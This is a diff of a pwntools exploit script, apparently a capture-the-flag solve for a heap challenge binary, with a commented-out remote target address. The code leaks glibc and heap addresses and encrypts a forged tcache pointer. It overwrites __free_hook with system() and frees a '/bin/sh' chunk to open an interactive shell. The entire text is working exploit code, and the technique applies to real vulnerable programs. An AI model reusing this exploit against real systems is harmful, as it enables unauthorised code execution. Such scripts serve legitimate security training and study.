@@ -17,6 +17,8 @@ continue
 pwn.context.terminal = ['tmux', 'splitw', '-h']
 binaryname = "./encrypted"
 
+# pwn.libcdb.unstrip_libc("./libc.so.6")
+
 #p=process(binaryname)
 #p=remote("207.154.239.148", 1369)
 p=pwn.gdb.debug(binaryname, gdbscript=gs)
@@ -94,15 +96,16 @@ malloc(4, 24)
 
 view_leak = view(0)
 leak = readLeakNorm(view_leak)
-print(f"leak (encrypted): {hex(leak)}")
-# leak = decrypt(encrypted_leak)
-# print(f"leak (decrypted): {hex(leak)}")
-
+print(f"glibc leak: {hex(leak)}")
 
 offset = 0x1e3ff0
 glibc_base = leak - offset 
 
+free(1)
+free(3)
 heap_address = readLeak(view(3))
+
+print(f"heap leak: {hex(heap_address)}")
 
 freehook_offset = 0x001e6e40
 
@@ -114,14 +117,11 @@ freehook_address = encrypt(glibc_base + freehook_offset, heap_address)
 
 # input("freezing to check gdb")
 
-free(1)
-# free(2)
 edit(4, b"/bin/sh")
 edit(1, pwn.p64(freehook_address))
 malloc(10, 24)
 malloc(11, 24)
 edit(11, pwn.p64(system_address))
 free(4)
-# free(1)
 
 p.interactive()
